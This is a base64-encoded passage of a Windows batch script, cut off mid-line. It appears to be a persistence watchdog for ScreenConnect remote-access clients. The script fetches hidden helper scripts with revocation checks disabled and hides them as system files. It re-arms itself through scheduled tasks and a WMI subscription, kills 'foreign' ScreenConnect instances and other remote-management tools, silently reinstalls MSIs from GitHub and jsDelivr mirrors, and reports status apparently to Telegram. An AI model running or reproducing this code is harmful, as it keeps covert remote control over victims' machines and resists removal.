IGZvciAlJUYgaW4gKCIlV0QlXHRnX3JlcG9ydC5uZXciKSBkbyBpZiAlJX56RiBHVFIgMTUwMCBt
b3ZlIC95ICIlV0QlXHRnX3JlcG9ydC5uZXciICIlV0QlXHRnX3JlcG9ydC5wczEiID5udWwgMj4m
MQpkZWwgL2YgL3EgIiVXRCVcdGdfcmVwb3J0Lm5ldyIgPm51bCAyPiYxCiIlQ1VSTCUiIC1MIC0t
c3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVXRCVc
b3duX3NlY3VyZS5uZXciICIlT1dOU0VDJSIgPm51bCAyPiYxCmlmIG5vdCBleGlzdCAiJVdEJVxv
d25fc2VjdXJlLm5ldyIgIiVDVVJMJSIgLUwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1l
IDMwIC1vICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJU9XTlNFQzIlIiA+bnVsIDI+JjEKYXR0cmli
IC1oIC1zIC1yICIlV0QlXG93bl9zZWN1cmUuY21kIiA+bnVsIDI+JjEKZmluZHN0ciAvQzoiT1dO
X1NFQ1VSRSBCVUlMRCIgIiVXRCVcb3duX3NlY3VyZS5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVG
IGluICgiJVdEJVxvd25fc2VjdXJlLm5ldyIpIGRvIGlmICUlfnpGIEdUUiA4MDAgbW92ZSAveSAi
JVdEJVxvd25fc2VjdXJlLm5ldyIgIiVXRCVcb3duX3NlY3VyZS5jbWQiID5udWwgMj4mMQpkZWwg
L2YgL3EgIiVXRCVcb3duX3NlY3VyZS5uZXciID5udWwgMj4mMQoiJUNVUkwlIiAtTCAtLXNzbC1u
by1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9s
aWIubmV3IiAiJU9XTkxJQiUiID5udWwgMj4mMQppZiBub3QgZXhpc3QgIiVXRCVcb3duX2xpYi5u
ZXciICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdE
JVxvd25fbGliLm5ldyIgIiVPV05MSUIyJSIgPm51bCAyPiYxCmF0dHJpYiAtaCAtcyAtciAiJVdE
JVxvd25fbGliLnBzMSIgPm51bCAyPiYxCmZpbmRzdHIgL0M6Ik9XTl9MSUIgIEJVSUxEIiAiJVdE
JVxvd25fbGliLm5ldyIgPm51bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlV0QlXG93bl9saWIubmV3
IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgbW92ZSAveSAiJVdEJVxvd25fbGliLm5ldyIgIiVXRCVc
b3duX2xpYi5wczEiID5udWwgMj4mMQpkZWwgL2YgL3EgIiVXRCVcb3duX2xpYi5uZXciID5udWwg
Mj4mMQpyZW0gc2VsZi11cGRhdGU6IGRvd25sb2FkIG5ldyBvd25fbW9uLCBhcHBseSBBRlRFUiB0
aGlzIHRpY2sgKEJVSUxELXZlcmlmaWVkKQpzZXQgIlNFTEZfVVBEPTAiCiIlQ1VSTCUiIC1MIC0t
c3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVc
b3duX21vbi5uZXh0IiAiJU9XTk1PTiUiID5udWwgMj4mMQppZiBub3QgZXhpc3QgIiVXRCVcb3du
X21vbi5uZXh0IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAg
LW8gIiVXRCVcb3duX21vbi5uZXh0IiAiJU9XTk1PTjIlIiA+bnVsIDI+JjEKZmluZHN0ciAvQzoi
T1dOX01PTiAgQlVJTEQiICIlV0QlXG93bl9tb24ubmV4dCIgPm51bCAyPiYxCmlmIG5vdCBlcnJv
cmxldmVsIDEgZm9yICUlRiBpbiAoIiVXRCVcb3duX21vbi5uZXh0IikgZG8gaWYgJSV+ekYgR1RS
IDE1MDAgKAogIGZjIC9iICIlV0QlXG93bl9tb24ubmV4dCIgIiVXRCVcb3duX21vbi5jbWQiID5u
dWwgMj4mMQogIGlmIGVycm9ybGV2ZWwgMSBzZXQgIlNFTEZfVVBEPTEiCikKaWYgIiVTRUxGX1VQ
RCUiPT0iMCIgZGVsIC9mIC9xICIlV0QlXG93bl9tb24ubmV4dCIgPm51bCAyPiYxCgpyZW0g4pSA
4pSAIFtCXSByZS1hcm0gY2hhaW4gMTogb3duZXJzaGlwLWF3YXJlIChub3QgZXhpc3RlbmNlLW9u
bHkpIOKUgOKUgApyZW0gTDExL00yMjogUXVlcnktb25seSBza2lwcGVkIHJlYXJtIHdoZW4gV2lu
ZG93cyBidWlsdC1pbiB0YXNrcyBzaGFyZWQKcmVtIGRlZmF1bHQgbmFtZXMgKERpYWdub3Npc1xT
Y2hlZHVsZWQgZXRjLikgLT4gbW9uIG5ldmVyIHJhbiwgbm8gbG9nLgppZiBleGlzdCAiJVdEJVxv
d25fbGliLnBzMSIgKAogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJz
aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAt
RmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiB0YXNrcy1lbnN1cmUgLVdvcmtEaXIgIiVX
RCUiIC1Nb25QYXRoICIlV0QlXG93bl9tb24uY21kImApIGRvICgKICAgIGVjaG8gdGFza3NfZW5z
dXJlICUlUj4+IiVMT0clIgogICAgc2V0ICJUQVNLU19FTlNVUkU9JSVSIgogICkKKQppZiBub3Qg
ZXhpc3QgIiVFVEwlIiBta2RpciAiJUVUTCUiID5udWwgMj4mMQppZiBleGlzdCAiJVdEJVxvd25f
bW9uLmNtZCIgKAogIGF0dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4m
MQogIGNvcHkgL3kgIiVXRCVcb3duX21vbi5jbWQiICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAy
PiYxCikKCnJlbSDilIDilIAgW0IyXSByZS1hcm0gY2hhaW4gMiAoV01JIHN1YnNjcmlwdGlvbikg
aWYgbWlzc2luZyDilIDilIDilIDilIDilIDilIDilIDilIDilIAKaWYgZXhpc3QgIiVXRCVcb3du
X2xpYi5wczEiICgKICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gd2F0Y2hkb2ctZW5zdXJlIC1Xb3JrRGlyICIl
V0QlIiAtTW9uUGF0aCAiJVdEJVxvd25fbW9uLmNtZCJgKSBkbyBzZXQgIldEX1NUQVRFPSUlUiIK
ICBpZiAvSSAiIVdEX1NUQVRFISI9PSJSRUFSTUVEIiBlY2hvIHdhdGNoZG9nIFdNSSBSRUFSTUVE
Pj4iJUxPRyUiCikKCnJlbSDilIDilIAgW0UwXSBzeW5jIEdyeXhhIEZQIGZyb20gUnVubmluZyBu
b24tc2V2cnogU0MgQkVGT1JFIGV4dGVybWluYXRlCnJlbSAgICAgKHByZXZlbnRzIGtpbGxpbmcg
R3J5eGEgYXMgZm9yZWlnbiBldmVyeSB0aWNrKQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIg
KAogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGlj
eSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gZ3J5eGEtaGVhbHRoIC1X
b3JrRGlyICIlV0QlIiA+bnVsIDI+JjEKICBpZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAv
ZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmci
KSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIgopCgpyZW0g
4pSA4pSAIFtFXSBleHRlcm1pbmF0ZSBmb3JlaWduIFNDICsgZGlzYWxsb3dlZCBSTU0gKEFGVEVS
IEdyeXhhIEZQIHN5bmMpIOKUgOKUgAppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJz
aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAt
RmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBleHRlcm1pbmF0ZSAtV29ya0RpciAiJVdE
JSIgPj4iJUxPRyUiIDI+JjEKdGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwKc2V0ICJGT1JFSUdO
X0xFRlQ9MCIKZm9yIC9mICJ0b2tlbnM9MiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1ZXJ5IHN0
YXRlXj0gYWxsIF58IGZpbmRzdHIgL0M6IlNFUlZJQ0VfTkFNRTogU2NyZWVuQ29ubmVjdCBDbGll
bnQiJykgZG8gKAogIHNldCAiRlA9JSVhIgogIHNldCAiRlA9IUZQOiA9ISIKICBpZiAvSSBub3Qg
IiFGUCEiPT0iJUtFRVBfRlAlIiBpZiAvSSBub3QgIiFGUCEiPT0iJUFMVF9GUCUiIGlmIC9JIG5v
dCAiIUZQISI9PSIlR1JZWEFfRlAlIiAoCiAgICBzZXQgL2EgQ09VTlQrPTEKICAgIHNldCAvYSBG
T1JFSUdOX0xFRlQrPTEKICAgIHNldCAiRk9SRUlHTl9MSVNUPSFGT1JFSUdOX0xJU1QhIUZQISAi
CiAgICBlY2hvIGZvcmVpZ25fbGVmdF8hRlAhPj4iJUxPRyUiCiAgKQopCgpyZW0g4pSA4pSAIFtD
XSBoZWFsIFNjcmVlbkNvbm5lY3QgcHJpbS9hbHQg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
CmZvciAvZiAidG9rZW5zPTEsMiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1ZXJ5ICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgXnwgZmluZHN0ciAvQzoiU0VSVklDRV9OQU1FIicp
IGRvICgKICBzZXQgIklOU1RBTExFRD0xIgogIHNldCAiUFJJTVNUQVRFPSUlYiIKKQpzYyBxdWVy
eSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51
bAppZiBub3QgZXJyb3JsZXZlbCAxICgKICBzZXQgIlBSSU1fT0s9MSIKICBzZXQgL2EgQ09VTlQr
PTEKKQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYx
CmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0IC9hIENPVU5UKz0xCnNjIHF1ZXJ5ICJTY3JlZW5Db25u
ZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwKaWYgbm90IGVycm9y
bGV2ZWwgMSBzZXQgIkFMVF9PSz0xIgoKaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9P
SyUiPT0iMCIgKAogIGVjaG8gc3ZjIGhlYWwgcmVzdGFydD4+IiVMT0clIgogIG5ldCBzdGFydCAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQogIHNjIHN0YXJ0ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxCiAgdGltZW91dCAvdCA2
IC9ub2JyZWFrID5udWwKICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQ
JSkiIHwgZmluZCAiUlVOTklORyIgPm51bAogIGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklN
X09LPTEiCikKcmVtIE0xNjogc3RpbGwgc3RvcHBlZCAtPiByZXBhaXIgdGhlIFJFR0lTVEVSRUQg
cHJvZHVjdCAobXNpZXhlYyAvZmEgcmVzdG9yZXMKcmVtIGJpbmFyaWVzICsgc3RhcnRzIHRoZSBz
ZXJ2aWNlOyBMNSBSZXBhaXItU0NTZXJ2aWNlIGhhbmRsZXMgc3RvcHBlZCBzdmNzKQppZiAiJUlO
U1RBTExFRCUiPT0iMSIgaWYgIiVQUklNX09LJSI9PSIwIiAoCiAgZWNobyBzdmMgZXNjYWxhdGUg
cmVwYWlyPj4iJUxPRyUiCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwg
LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUg
IiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJUtFRVBfRlAlIiAtV29ya0Rp
ciAiJVdEJSIgPj4iJUxPRyUiIDI+JjEKICB0aW1lb3V0IC90IDggL25vYnJlYWsgPm51bAogIHNj
IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5H
IiA+bnVsCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIlBSSU1fT0s9MSIKKQpyZW0gTTE2OiBv
cnBoYW5lZCBzZXJ2aWNlIGVudHJ5IChwcm9kdWN0IHVucmVnaXN0ZXJlZCAtIGVhdGVuIGJ5IGFu
IFNDLWZhbWlseQpyZW0gdXBncmFkZSByZW1vdmFsKSBjYW4gTkVWRVIgc3RhcnQuIERlbGV0ZSBp
dCBhbmQgZmFsbCB0aHJvdWdoIHRvIHRoZQpyZW0gZnJlc2gtaW5zdGFsbCBsYWRkZXIgYmVsb3cg
aW5zdGVhZCBvZiBhbGVydGluZyAid29udCBzdGFydCIgZm9yZXZlci4KaWYgIiVJTlNUQUxMRUQl
Ij09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKAogIHNldCAiUkVHU1RBVEU9dW5rbm93biIKICBp
ZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9yIC9mICJkZWxpbXM9IiAlJVIgaW4gKCdwb3dl
cnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNz
IC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlZ2lzdGVyZWQgLUZwICIlS0VFUF9G
UCUiIC1Xb3JrRGlyICIlV0QlIicpIGRvIHNldCAiUkVHU1RBVEU9JSVSIgogIGVjaG8gb3JwaGFu
X2NoZWNrPSFSRUdTVEFURSE+PiIlTE9HJSIKICBpZiAvSSAiIVJFR1NUQVRFISI9PSJubyIgKAog
ICAgZWNobyBvcnBoYW5fc2VydmljZV9kZWxldGU+PiIlTE9HJSIKICAgIHNjIGRlbGV0ZSAiU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQogICAgc2V0ICJJTlNUQUxM
RUQ9MCIKICApCikKaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKAog
IHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBC
eXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVX
RCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInN2Yy13b250LXN0YXJ0IiA+bnVsIDI+JjEKICBj
YWxsIDpUZ1N0YXRlIERPV04gIlNjcmVlbkNvbm5lY3QgKCVLRUVQX0ZQJSkgaW5zdGFsbGVkIGJ1
dCB3b250IHN0YXJ0IgogIGdvdG8gOkFmdGVySGVhbAopCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBn
b3RvIDpBZnRlckhlYWwKCnJlbSDilIDilIAgW0RdIHByaW1hcnkgU0MgbWlzc2luZyAtIGhlYWwg
bGFkZGVyIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgApyZW0gTTEyOiBGSVJTVCByZXBhaXIgdGhlIHJlZ2lzdGVyZWQgcHJv
ZHVjdCAocmVjcmVhdGVzIHNlcnZpY2Ugd2l0aG91dApyZW0gdG91Y2hpbmcgdGhlIEFMVCBpbnN0
YW5jZSk7IGZyZXNoIG1zaWV4ZWMgaW5zdGFsbCBvbmx5IGFzIGZhbGxiYWNrLgplY2hvIHN2YyBt
aXNzaW5nIC0gaGVhbCBiZWdpbj4+IiVMT0clIgpjYWxsIDpSZXBhaXJSZWdpc3RlcmVkICIlS0VF
UF9GUCUiCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5k
ICJSVU5OSU5HIiA+bnVsCmlmIG5vdCBlcnJvcmxldmVsIDEgKAogIHNldCAiSU5TVEFMTEVEPTEi
CiAgc2V0ICJQUklNX09LPTEiCiAgZ290byA6QWZ0ZXJIZWFsCikKcmVtIHJlZnVzZSBmcmVzaCAv
aSBpZiBwcm9kdWN0IHN0aWxsIHJlZ2lzdGVyZWQgLSBVcGdyYWRlIHRhYmxlIGNhbiB3aXBlIEFM
VC9HUllYQQpzZXQgIlJFR1NUQVRFPXVua25vd24iCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMx
IiBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmls
ZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
X2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVX
RCUiYCkgZG8gc2V0ICJSRUdTVEFURT0lJVIiCmlmIC9JICIhUkVHU1RBVEUhIj09InllcyIgKAog
IGVjaG8gcHJpbWFyeV9yZWdpc3RlcmVkX3NraXBfZnJlc2hfaW5zdGFsbD4+IiVMT0clIgogIHBv
d2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBh
c3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUi
IC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInJlZ2lzdGVyZWQtc3R1Y2siID5udWwgMj4mMQogIGNh
bGwgOlRnU3RhdGUgRE9XTiAiUHJpbWFyeSByZWdpc3RlcmVkIGJ1dCBzZXJ2aWNlIG1pc3Npbmcg
LSAvZmEgZmFpbGVkOyByZWZ1c2VkIC9pIHRvIHByb3RlY3QgQUxUL0dSWVhBIgogIGdvdG8gOkFm
dGVySGVhbAopCnJlbSBPMzc6IHJlZnVzZSBzZXZyeiAvaSB3aGVuIGdyeXhhIGFscmVhZHkgcHJl
c2VudCDigJQgc2hhcmVkIGxlZ2FjeSBVcGdyYWRlQ29kZXMKcmVtIHswQzk0NDQ4Qn0vezFGODVE
N0ZFfSBtYWtlIHNpYmxpbmcgbXNpZXhlYyAvaSBrbm9jayBHcnl4YSBPRkZMSU5FIGluIHBhbmVs
LgpzZXQgIkdSRUc9dW5rbm93biIKaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAi
dXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRl
cmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIg
LUFjdGlvbiByZWdpc3RlcmVkIC1GcCAiJUdSWVhBX0ZQJSIgLVdvcmtEaXIgIiVXRCUiYCkgZG8g
c2V0ICJHUkVHPSUlUiIKc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAl
KSIgPm51bCAyPiYxCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJHUkVHPXllcyIKaWYgL0kgIiFH
UkVHISI9PSJ5ZXMiICgKICBlY2hvIHByaW1hcnlfc2tpcF9pX3Byb3RlY3RfZ3J5eGE+PiIlTE9H
JSIKICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGly
ICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJwcm90ZWN0LWdyeXhhLXNraXAtcHJpbWFy
eS1pIiA+bnVsIDI+JjEKICBjYWxsIDpUZ1N0YXRlIERPV04gIlByaW1hcnkgbWlzc2luZyAtIHJl
ZnVzZWQgc2V2cnogL2kgdG8gcHJvdGVjdCBHcnl4YSAoc2hhcmVkIFNDIFVwZ3JhZGVDb2Rlcyk7
IC9mYSBvbmx5IgogIGdvdG8gOkFmdGVySGVhbAopCmlmICIlSU5TVEFMTEVEJSI9PSIwIiBjYWxs
IDpJbnN0YWxsTXNpICIlTVNJX1VSTCUiICJtYWluIgppZiAiJUlOU1RBTExFRCUiPT0iMCIgY2Fs
bCA6SW5zdGFsbE1zaSAiJU1TSV9QS0cxJT90PSVSQU5ET00lIiAiZ2l0aHViLXBrZyIKaWYgIiVJ
TlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxNc2kgIiVNU0lfUEtHMiUiICJqc2RlbGl2ci1w
a2ciCmlmICIlSU5TVEFMTEVEJSI9PSIwIiAoCiAgcmVtIHByZWZlciB3b3JrZXItY2FjaGVkIC53
dWNhY2hlXHBrZy5tc2kgKHNhbWUgYmluYXJ5IGFzIGRlcGxveSkKICBhdHRyaWIgLWggLXMgLXIg
IiVNU0lDQUNIRSUiID5udWwgMj4mMQogIGZvciAlJUYgaW4gKCIlTVNJQ0FDSEUlIikgZG8gaWYg
JSV+ekYgR1RSIDEwMDAwMDAgKAogICAgZWNobyB3dWNhY2hlX3BrZ19yZXRyeT4+IiVMT0clIgog
ICAgYXR0cmliIC1oIC1zIC1yICIlTVNJJSIgPm51bCAyPiYxCiAgICBjb3B5IC95ICIlTVNJQ0FD
SEUlIiAiJU1TSSUiID5udWwgMj4mMQogICkKICBmb3IgJSVGIGluICgiJU1TSSUiKSBkbyBpZiAl
JX56RiBHVFIgMTAwMDAwMCAoCiAgICBlY2hvIGNhY2hlIHJldHJ5IGluc3RhbGw+PiIlTE9HJSIK
ICAgIGNhbGwgOk5vTXNpUG9saWN5CiAgICBtc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3Rh
cnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbC5s
b2ciID5udWwgMj4mMQogICAgc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISIKICAgIGVjaG8gY2Fj
aGUgbXNpZXhlYyBleGl0PSFNU0lFWElUIT4+IiVMT0clIgogICAgaWYgIiFNU0lFWElUISI9PSIx
NjE4IiAoCiAgICAgIHRpbWVvdXQgL3QgMzAgL25vYnJlYWsgPm51bAogICAgICBtc2lleGVjIC9p
ICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3Mg
L0wqdiAiJVdEJVxtc2lfaGVhbDIubG9nIiA+bnVsIDI+JjEKICAgICAgc2V0ICJNU0lFWElUPSFF
UlJPUkxFVkVMISIKICAgICAgZWNobyBjYWNoZV9yZXRyeTE2MThfZXhpdD0hTVNJRVhJVCE+PiIl
TE9HJSIKICAgICkKICAgIGNhbGwgOldhaXRTdmMKICApCikKY2FsbCA6UmVzdG9yZUFsdApjYWxs
IDpFbnN1cmVHcnl4YU11c3QKaWYgIiVJTlNUQUxMRUQlIj09IjAiICgKICBpZiBleGlzdCAiJVdE
JVxtc2lfaGVhbC5sb2ciICgKICAgIGVjaG8gLS0tIG1zaV9oZWFsLmxvZyB0YWlsIC0tLT4+IiVM
T0clIgogICAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAi
R2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXG1zaV9oZWFsLmxvZycgLVRhaWwgMTAiID4+
IiVMT0clIiAyPiYxCiAgKQogIGlmIG5vdCBkZWZpbmVkIE1TSUVYSVQgc2V0ICJNU0lFWElUPWZl
dGNoLWZhaWwiCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0
aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAt
V29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAibXNpLWZhaWxlZCIgPm51bCAy
PiYxCiAgY2FsbCA6VGdTdGF0ZSBGQUlMICJNU0kgaW5zdGFsbCBmYWlsZWQgb24gYWxsIHNvdXJj
ZXMgKG1zaWV4ZWMgZXhpdCAlTVNJRVhJVCUpIgopIGVsc2UgKAogIGVjaG8gc3ZjIHJlc3RvcmVk
Pj4iJUxPRyUiCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0
aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAt
V29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAicmVzdG9yZWQiID5udWwgMj4m
MQogIGNhbGwgOlRnU3RhdGUgUkVTVE9SRUQgIlNjcmVlbkNvbm5lY3QgcmVpbnN0YWxsZWQgT0si
CikKCjpBZnRlckhlYWwKcmVtIE0xNjogQUxUIHByZXNlbnQtYnV0LXN0b3BwZWQgLT4gcmVzdGFy
dCwgdGhlbiByZXBhaXItYnktR1VJRCAoZXZlcnkgdGljaykKc2MgcXVlcnkgIlNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQppZiBub3QgZXJyb3JsZXZlbCAxICgKICBz
YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5H
IiA+bnVsCiAgaWYgZXJyb3JsZXZlbCAxICgKICAgIGVjaG8gYWx0IHN0b3BwZWQgLSByZXN0YXJ0
L3JlcGFpcj4+IiVMT0clIgogICAgbmV0IHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFM
VF9GUCUpIiA+bnVsIDI+JjEKICAgIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFM
VF9GUCUpIiA+bnVsIDI+JjEKICAgIHRpbWVvdXQgL3QgNSAvbm9icmVhayA+bnVsCiAgICBzYyBx
dWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+
bnVsCiAgICBpZiBlcnJvcmxldmVsIDEgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vy
c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg
LUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJUFMVF9GUCUiIC1X
b3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQogICkKKQpyZW0gTTE3OiBBTFQgc2VydmljZSBl
bnRyeSBkZWxldGVkIGJ1dCBwcm9kdWN0IHJlZ2lzdGVyZWQgLT4gcmVwYWlyLWJ5LUdVSUQgZXZl
cnkgdGljawpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAy
PiYxCmlmIGVycm9ybGV2ZWwgMSAoCiAgZWNobyBhbHRfbWlzc2luZ190cnlfcmVwYWlyPj4iJUxP
RyUiCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAt
Tm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xp
